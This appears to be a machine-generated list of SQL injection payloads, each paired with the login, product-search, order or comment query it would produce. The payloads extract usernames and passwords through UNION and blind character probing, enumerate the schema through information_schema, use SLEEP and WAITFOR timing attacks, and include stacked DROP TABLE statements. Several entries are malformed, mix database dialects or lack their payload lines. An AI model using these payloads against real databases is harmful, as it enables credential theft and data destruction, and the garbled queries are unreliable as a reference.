payload: (SELECT * FROM users WHERE username = '' AND password LIKE '%#')
full_query: SELECT * FROM users WHERE username = '(SELECT * FROM users WHERE username = '' AND password LIKE '%#')' AND password = 'anything'

payload: ' OR (SELECT * FROM users WHERE username = '') IS NULL/*
full_query: SELECT * FROM users WHERE username = '' OR (SELECT * FROM users WHERE username = '') IS NULL/*' AND password = 'anything'
SELECT * FROM users WHERE username = '(' OR ASCII(SUBSTRING(username,1,1))=ASCII('u') AND ASCII(SUBSTRING(password,1,1))=ASCII('u'))--' AND password = 'anything'

payload: 1' AND 1 = 2 UNION ALL SELECT NULL, NULL FROM users WHERE 1 = 1 --
full_query: SELECT * FROM users WHERE username = '1' AND 1 = 2 UNION ALL SELECT NULL, NULL FROM users WHERE 1 = 1 --' AND password = 'anything'

payload: (SELECT username FROM users WHERE 1 = 0 UNION SELECT 'admin')--
full_query: SELECT * FROM users WHERE username = '(SELECT username FROM users WHERE 1 = 0 UNION SELECT 'admin')--' AND password = 'anything'
SELECT * FROM users WHERE username = '1' AND (SELECT 1 FROM users WHERE username = 'admin') = 1;' AND password = 'anything'

payload: 1' AND LENGTH((SELECT username FROM users WHERE username = 'admin')) > 0--
full_query: SELECT * FROM users WHERE username = '1' AND LENGTH((SELECT username FROM users WHERE username = 'admin')) > 0--' AND password = 'anything'

payload: 1' AND ASCII(SUBSTRING((SELECT username FROM users WHERE username = 'admin'), 1, 1)) = 97--
full_query: SELECT * FROM users WHERE username = '1' AND ASCII(SUBSTRING((SELECT username FROM users WHERE username = 'admin'), 1, 1)) = 97--' AND password = 'anything'

payload: and '1'='1' UNION ALL SELECT username, password FROM admin --
full_query: SELECT * FROM products WHERE name LIKE '%and '1'='1' UNION ALL SELECT username, password FROM admin --%'
SELECT * FROM products WHERE name LIKE '%||;WAITFOR DELAY '0:0:10';--%'

payload: from dual where 1=(select 1 from (select 1 from sysobjects where id=object_id('users')))--
full_query: SELECT * FROM products WHERE name LIKE '%from dual where 1=(select 1 from (select 1 from sysobjects where id=object_id('users')))--%'

payload: 1' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username = 'admin')) --
full_query: SELECT * FROM products WHERE name LIKE '%1' AND (SELECT 1 FROM (SELECT 1 FROM users WHERE username = 'admin')) --%'

payload: ; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM users WHERE username = 'admin') --
full_query: SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM users WHERE username = 'admin') --%'

payload: 1' AND (SELECT 1 FROM (SELECT 1 FROM information_schema.users WHERE user = 'root')) --
full_query: SELECT * FROM products WHERE name LIKE '%1' AND (SELECT 1 FROM (SELECT 1 FROM information_schema.users WHERE user = 'root')) --%'

payload: ' and (SELECT COUNT(*) FROM (SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees))) --
full_query: SELECT * FROM products WHERE name LIKE '%' and (SELECT COUNT(*) FROM (SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees))) --%'

payload: 1' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users WHERE username = 'admin') = 97 #
full_query: SELECT * FROM products WHERE name LIKE '%1' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users WHERE username = 'admin') = 97 #%'
SELECT * FROM products WHERE name LIKE '%1' AND (SELECT IF(1=1, BENCHMARK(5000000, ENCODE('admin', 'password')), 'no')) --%'

payload: (SELECT (CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 'yes' ELSE 'no' END)) --
full_query: SELECT * FROM products WHERE name LIKE '%(SELECT (CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 'yes' ELSE 'no' END)) --%'

payload: 1' AND EXISTS(SELECT 1 FROM products WHERE price < (SELECT MIN(price) FROM products WHERE category = 'Electronics')) --
full_query: SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT 1 FROM products WHERE price < (SELECT MIN(price) FROM products WHERE category = 'Electronics')) --%'
SELECT * FROM users WHERE id = IF((SELECT 1), '1', '1')--
SELECT * FROM users WHERE id = (SELECT WAITFOR DELAY '00:00:05' FROM sys.objects)--

payload: AND ('A' LIKE 'A' AND EXISTS(SELECT * FROM users))--
full_query: SELECT * FROM users WHERE id = AND ('A' LIKE 'A' AND EXISTS(SELECT * FROM users))--

payload: 1' UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(username) FROM users WHERE id>0 LIMIT 1),NULL--
full_query: SELECT * FROM users WHERE id = 1' UNION SELECT NULL,NULL,(SELECT GROUP_CONCAT(username) FROM users WHERE id>0 LIMIT 1),NULL--

payload: ' OR id IN (SELECT ASCII(SUBSTRING(user(), 1, 1)) FROM users) --
full_query: SELECT * FROM users WHERE id = ' OR id IN (SELECT ASCII(SUBSTRING(user(), 1, 1)) FROM users) --

payload: --' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --
full_query: SELECT * FROM orders WHERE status = '--' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin') --' ORDER BY date DESC

payload: /*' OR 1=1*/ UNION ALL SELECT NULL,NULL,NULL,CONCAT(SUBSTRING(CAST((SELECT GROUP_CONCAT(password SEPARATOR ',') FROM users) AS CHAR), 1, 5))--
full_query: SELECT * FROM orders WHERE status = '/*' OR 1=1*/ UNION ALL SELECT NULL,NULL,NULL,CONCAT(SUBSTRING(CAST((SELECT GROUP_CONCAT(password SEPARATOR ',') FROM users) AS CHAR), 1, 5))--' ORDER BY date DESC

payload: ' AND EXISTS(SELECT 1 FROM customers WHERE customer_id IN (SELECT customer_id FROM orders WHERE status='pending')) --
full_query: SELECT * FROM orders WHERE status = '' AND EXISTS(SELECT 1 FROM customers WHERE customer_id IN (SELECT customer_id FROM orders WHERE status='pending')) --' ORDER BY date DESC
SELECT * FROM orders WHERE status = ''; DROP TABLE IF EXISTS temp_table; --' ORDER BY date DESC
SELECT * FROM orders WHERE status = '--' OR (SELECT 1 FROM products WHERE product_id=1) --' ORDER BY date DESC

payload: --' AND (SELECT CAST(VERSION() AS INT)) > (SELECT CAST(SUBSTRING(@@version, 1, 4) AS INT) + 0) --"
full_query: SELECT * FROM orders WHERE status = '--' AND (SELECT CAST(VERSION() AS INT)) > (SELECT CAST(SUBSTRING(@@version, 1, 4) AS INT) + 0) --"' ORDER BY date DESC

payload: (SELECT SLEEP(5)) OR (SELECT (SELECT 1) FROM information_schema.tables WHERE table_name LIKE '__users%')"
full_query: SELECT * FROM orders WHERE status = '(SELECT SLEEP(5)) OR (SELECT (SELECT 1) FROM information_schema.tables WHERE table_name LIKE '__users%')"' ORDER BY date DESC

payload: ; WAITFOR DELAY '0:0:5'; SELECT CONCAT(username, ':", password, "' FROM users) --"
full_query: SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:5'; SELECT CONCAT(username, ':", password, "' FROM users) --"' ORDER BY date DESC

payload: --' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin' LIMIT 1) > 97 --"
full_query: SELECT * FROM orders WHERE status = '--' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin' LIMIT 1) > 97 --"' ORDER BY date DESC

payload: (SELECT (CASE WHEN 1=1 THEN (SELECT group_concat(password SEPARATOR ',') FROM users) ELSE '' END))
full_query: SELECT * FROM orders WHERE status = '(SELECT (CASE WHEN 1=1 THEN (SELECT group_concat(password SEPARATOR ',') FROM users) ELSE '' END))' ORDER BY date DESC

payload: /*' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username IS NULL) --

INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 AND (SELECT SUBSTRING(SLEEP(5),1,1)) --')
INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE IF EXISTS backup_comments; --')

payload: ' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name LIKE '%comments%') --

full_query: INSERT INTO comments (user_id, body) VALUES (1, '' OR LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE())) > 0 --')

full_query: INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE database())--')

payload: --' OR 1=1 AND (SELECT COUNT(*) FROM (SELECT * FROM users LIMIT 1))--
full_query: INSERT INTO comments (user_id, body) VALUES (1, '--' OR 1=1 AND (SELECT COUNT(*) FROM (SELECT * FROM users LIMIT 1))--')

payload: ' OR 1=1 AND (SELECT ASCII(SUBSTRING(body, 1, 1)) FROM comments LIMIT 1) > 0--
full_query: INSERT INTO comments (user_id, body) VALUES (1, '' OR 1=1 AND (SELECT ASCII(SUBSTRING(body, 1, 1)) FROM comments LIMIT 1) > 0--')

payload: ; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM (SELECT * FROM comments ORDER BY comment_id DESC LIMIT 1))--
